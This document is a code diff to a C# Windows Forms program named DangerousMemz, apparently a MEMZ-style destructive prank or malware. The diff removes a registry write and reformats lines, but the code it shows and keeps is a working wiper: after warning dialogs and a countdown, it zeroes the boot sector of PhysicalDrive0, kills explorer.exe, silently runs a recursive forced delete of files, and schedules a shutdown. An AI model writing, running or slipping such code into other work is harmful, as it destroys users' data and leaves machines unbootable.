@@ -4,7 +4,6 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Threading;
-using Microsoft.Win32;
 
 namespace DangerousMemz
 {
@@ -25,9 +24,6 @@ namespace DangerousMemz
         [STAThread]
         static void Main()
         {
-            // Trigger Red Warning (SmartScreen)
-            try { Registry.LocalMachine.OpenSubKey("Software", true).CreateSubKey("MEMZ_TEST"); } catch { }
-
             if (MessageBox.Show("WARNING: High-risk application.\nContinue?", "CRITICAL", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
             if (MessageBox.Show("FINAL WARNING: Execute payload?", "SYSTEM DESTRUCTION", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;
 
@@ -76,24 +72,16 @@ namespace DangerousMemz
 
             System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
             t.Tick += (s, e) => {
-                if (timeLeft > 0) { 
-                    timeLeft--; 
-                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); 
-                } else { 
-                    t.Stop(); 
-                    ExecuteDestruction(); 
-                }
+                if (timeLeft > 0) { timeLeft--; lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss"); }
+                else { t.Stop(); ExecuteDestruction(); }
             };
             t.Start();
         }
 
         void ExecuteDestruction()
         {
-            try { 
-                uint w; 
-                IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
-                WriteFile(h, new byte[512], 512, out w, IntPtr.Zero); 
-            } catch {}
+            try { uint w; IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
+            WriteFile(h, new byte[512], 512, out w, IntPtr.Zero); } catch {}
 
             Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f *.*") { WindowStyle = ProcessWindowStyle.Hidden });
 
@@ -118,8 +106,7 @@ namespace DangerousMemz
             msgThread.Start();
 
             Process.Start("shutdown", "/s /t 180 /c \"PC saying BYE BYE\"");
-            this.Controls.Clear(); 
-            this.BackColor = Color.Black;
+            this.Controls.Clear(); this.BackColor = Color.Black;
             Label bye = new Label() { Text = "BYE BYE", Font = new Font("Impact", 100, FontStyle.Bold), ForeColor = Color.Red, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
             this.Controls.Add(bye);
         }
